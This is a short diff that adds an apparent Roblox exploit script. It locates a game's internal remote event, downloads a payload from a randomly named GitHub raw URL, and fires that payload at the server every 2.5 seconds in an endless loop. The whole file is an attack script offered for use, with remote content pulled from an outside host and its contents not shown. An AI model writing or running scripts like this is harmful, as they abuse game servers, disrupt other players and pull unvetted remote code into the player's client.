@@ -1,0 +1,5 @@
+local func = workspace:WaitForChild("__THINGS"):WaitForChild("__REMOTES"):WaitForChild("MAIN")
+local execute = game:HttpGet("https://raw.githubusercontent.com/gabbytheduper/kmxcjeqyi/main/jzcmweu")
+while true do wait(2.5) func:FireServer("b", execute)
+end
+
